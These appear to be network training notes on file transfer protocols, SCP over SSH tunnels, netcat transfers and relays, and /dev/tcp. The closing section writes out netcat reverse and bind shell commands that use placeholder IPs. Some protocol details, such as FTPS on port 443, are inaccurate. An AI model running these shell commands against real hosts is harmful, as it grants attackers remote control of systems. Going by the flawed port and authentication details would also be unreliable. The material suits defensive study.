Common methods for transfering Data:

#TFTP: RFC 1350 Rev2#
UDP Transport
Extremely small and very simple authentication
No terminal communication()
Insecure (No authentication or encryption)
No directory services
Used often for technologies such as BOOTP and PXE

#FTP: RFC 959#
TCP transport
Uses multiple TCP connections
Control Connection (21) / Data Connection (20)
Authentication through clear-text sign in (username and password)
Insecure in default configuration
Has directory services
Can be enhanced with SSL/TLS (FTPS)
Anonymous login

#SFTP#
TCP transport (TCP port 22)
Uses symmetric and asymmetric encryption
Adds FTP like services to SSH
Authentication through sign in (username and password) or with SSH key
Interactive terminal access

#FTPS# File transfer protocol Secure
TCP transport(TCP port 443)
Adds SSL\TLS encryption to FTP
Authentication with username/password and/or PKI
Interactive terminal access
Requires a server to be running
Format: ftp 127.0.0.1
use >get command
>wget -r ftp://localhost
-r recursively grabs everything

#SCP# Secure copy protocol
TCP transport (TCP port 22)
Use symmetric and asymmetric encryption

SCP Syntax:

Download a file from a remote directory to a local directory
scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory
scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a seperate remote host
scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student

SCP syntax w/alternative SSHD

Download a file from a remote directory to a local directory
scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory
scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student

SCP syntax through a tunnel:

Tunnel: ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Download a file from a remote directory to a local directory
scp -P 1111 student@localhost:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory
scp -P 1111 secretstuff.txt student@localhost:/home/student

#Traffic redirection Using Tools#

Netcat: 

Can be used for the following:
inbound and outbound connections, TCP/UDP, to or from any ports
troubleshooting network connections
sending/receiving data (insecurely)
port scanning (similar to -sT in Nmap)

NETCAT: 

Client to listener file transfer:

Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

NETCAT: Listener to Client file transfer:

Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

Netcat Relay Demo:

On Client Relay:
mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe

On Listener2 (sends info):
nc -l -p 9002 < infile.txt

On Listener1 (receives info):
nc -l -p 9001 > outfile.txt
Writes the output to listener1 and listener2 through the named pipe


File Transfer with /dev/tcp

On the receiving box:
nc -l -p 1111 > file.txt

On the sending box:
cat file.txt > /dev/tcp/10.2.0.2/1111

This method is useful for host that does not have NETCAT available.

Reverse shell using netcat: 

When shelled into the remote host using -c :
nc -c /bin/sh <your ip> <any unfiltered port>

You could even pipe BASH through NETCAT.
/bin/sh | nc <your ip> <any unfiltered port>

Then listen for the shell.
nc -l -p <same unfiltered port> -vvv

You can also listen using the -e with NETCAT.
nc -l -p <any unfiltered port> -e /bin/bash
















